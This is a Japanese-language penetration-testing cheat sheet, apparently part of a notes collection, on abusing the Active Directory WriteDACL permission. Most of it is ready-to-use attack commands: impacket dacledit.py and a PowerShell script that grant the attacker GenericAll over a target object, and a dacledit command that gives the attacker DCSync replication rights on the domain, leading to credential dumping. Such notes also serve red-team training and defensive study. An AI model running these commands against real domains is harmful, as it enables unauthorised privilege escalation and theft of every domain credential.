# WriteDACL の悪用

## 概要

`WriteDACL` は対象オブジェクトの DACL（Discretionary Access Control List）を変更する権限。自分自身または任意のユーザーに `GenericAll` 相当の権限を付与することで、間接的に完全制御を得られる。

---

## 着火条件

BloodHound で `[現在のユーザー or グループ] --WriteDACL--> [ターゲットオブジェクト]` が確認できた場合。

---

## 悪用手順

### ステップ1: 自分自身に GenericAll を付与する

```bash
# impacket の dacledit を使用
dacledit.py -action write \
  -rights FullControl \
  -principal '[CURRENT_USER]' \
  -target '[TARGET_OBJECT]' \
  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]' \
  -dc-ip [DC_IP]
```

または PowerShell（Windows シェル内から）：
```powershell
$ACL = Get-ACL "AD:[TARGET_OBJECT_DN]"
$SID = (Get-ADUser [CURRENT_USER]).SID
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $SID, 
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow
)
$ACL.AddAccessRule($ACE)
Set-ACL "AD:[TARGET_OBJECT_DN]" $ACL
```

### ステップ2: GenericAll を使って目的の操作を実施

→ `GenericAll.md` の手法を適用

---

## ドメインオブジェクトへの WriteDACL（DCSync 権限の付与）

ドメインオブジェクト自体（`DC=domain,DC=tld`）に WriteDACL がある場合、DCSync に必要な複製権限を自分自身に付与できる。

```bash
# DS-Replication-Get-Changes と DS-Replication-Get-Changes-All を付与
dacledit.py -action write \
  -rights DCSync \
  -principal '[CURRENT_USER]' \
  -target-dn 'DC=[DOMAIN],DC=[TLD]' \
  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]' \
  -dc-ip [DC_IP]
```

→ その後 DCSync を実行: `../Credential_Dumping.md`

---

## 注意点・落とし穴

- DACL の変更はイベントログに記録される（セキュリティ上の痕跡が残る）
- 付与した権限は調査後にクリーンアップすることが望ましい
- ドメインオブジェクトへの変更は特に影響が大きいため慎重に操作する

---

## 関連技術
- GenericAll を取得後 → `GenericAll.md`
- DCSync を実行 → `../Credential_Dumping.md`
